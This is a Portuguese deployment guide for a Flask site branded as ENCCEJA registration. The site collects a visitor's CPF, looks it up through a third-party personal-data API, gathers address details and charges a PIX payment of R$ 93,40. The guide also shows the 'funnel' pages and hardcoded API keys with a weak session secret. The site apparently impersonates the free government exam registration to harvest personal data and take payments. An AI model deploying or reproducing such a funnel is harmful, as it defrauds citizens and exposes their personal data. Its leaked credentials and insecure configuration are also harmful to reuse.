# VPS - Deploy Completo ENCCEJA com APIs Reais

## Status Atual: ✅ Ambiente Virtual Funcionando

Agora vamos configurar o projeto completo com todas as APIs reais.

## 1. Upload dos Arquivos Necessários

Via MobaXterm/FileZilla, faça upload para `/var/www/encceja/`:

### Arquivos Python:
- `VPS_FINAL_CLEAN_APP.py` → `/var/www/encceja/app.py` (substitua o atual)
- `witepay_gateway.py` → `/var/www/encceja/witepay_gateway.py`
- `payment_gateway.py` → `/var/www/encceja/payment_gateway.py`

### Diretórios:
- `templates/` → `/var/www/encceja/templates/` (todos os arquivos HTML)
- `static/` → `/var/www/encceja/static/` (CSS, JS, imagens)

## 2. Configurar Variáveis de Ambiente

```bash
cd /var/www/encceja

# Criar .env com as chaves reais
cat > .env << 'EOF'
WITEPAY_API_KEY=sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d
SESSION_SECRET=encceja-vps-2025-secret-key
DOMAIN_RESTRICTION=false
CPF_API_TOKEN=1285fe4s-e931-4071-a848-3fac8273c55a
EOF

# Instalar python-dotenv no venv
source venv/bin/activate
pip install python-dotenv
```

## 3. Atualizar app.py para Ler .env

```bash
# Adicionar carregamento do .env no início do app.py
sed -i '1i from dotenv import load_dotenv\nload_dotenv()' app.py
```

## 4. Instalar Dependências Adicionais

```bash
cd /var/www/encceja
source venv/bin/activate
pip install python-dotenv pillow qrcode[pil]
```

## 5. Testar Aplicação Completa

```bash
# Testar aplicação manual
cd /var/www/encceja
source venv/bin/activate
python app.py

# Deve mostrar:
# "🚀 Iniciando ENCCEJA VPS..."
# "📍 Aplicação rodando em: http://0.0.0.0:5000"
```

## 6. Reiniciar Supervisor

```bash
# Parar aplicação atual
supervisorctl stop encceja

# Reiniciar com app completo
supervisorctl start encceja

# Verificar status
supervisorctl status encceja

# Ver logs
tail -f /var/log/encceja.log
```

## 7. Teste das APIs

### Teste CPF API:
```bash
curl -X POST http://127.0.0.1:5000/buscar-cpf \
  -H "Content-Type: application/json" \
  -d '{"cpf":"12345678901"}'
```

### Teste PIX:
```bash
curl -X POST http://127.0.0.1:5000/criar-pagamento-pix \
  -H "Content-Type: application/json" \
  -d '{}'
```

## 8. URLs do Funnel Completo

Teste todas as páginas:
- `/` → Redireciona para `/inscricao`
- `/inscricao` → Formulário CPF
- `/encceja-info` → Informações do exame
- `/validar-dados` → Validação de dados
- `/endereco` → Formulário endereço
- `/local-prova` → Seleção local
- `/pagamento` → PIX R$ 93,40
- `/inscricao-sucesso` → Confirmação

## 9. Verificar Logs em Tempo Real

```bash
# Terminal 1: Logs da aplicação
tail -f /var/log/encceja.log

# Terminal 2: Logs do Nginx
tail -f /var/log/nginx/access.log

# Terminal 3: Status dos serviços
watch -n 2 "supervisorctl status encceja && echo 'Nginx:' && systemctl is-active nginx"
```

## 10. Teste Completo do Funnel

1. Acesse seu domínio
2. Digite um CPF válido
3. Navegue por todas as páginas
4. Teste a geração do PIX
5. Verifique se o QR code aparece

## Estrutura Final Esperada:

```
/var/www/encceja/
├── app.py                 # Aplicação principal completa
├── witepay_gateway.py     # Gateway WitePay real
├── payment_gateway.py     # Gateway de pagamentos
├── .env                   # Variáveis de ambiente
├── requirements.txt       # Dependências
├── venv/                  # Ambiente virtual
├── templates/             # Templates HTML
│   ├── inscricao.html
│   ├── pagamento.html
│   ├── encceja_info.html
│   └── ...
└── static/                # Arquivos estáticos
    ├── css/
    ├── js/
    └── images/
```

## APIs Configuradas:

- ✅ **CPF API**: consulta.fontesderenda.blog
- ✅ **WitePay**: Gateway real com fallback PIX
- ✅ **QR Code**: Geração visual com qrcode[pil]
- ✅ **Templates**: Interface completa ENCCEJA

Após seguir estes passos, o sistema completo estará funcionando com todas as APIs reais na VPS!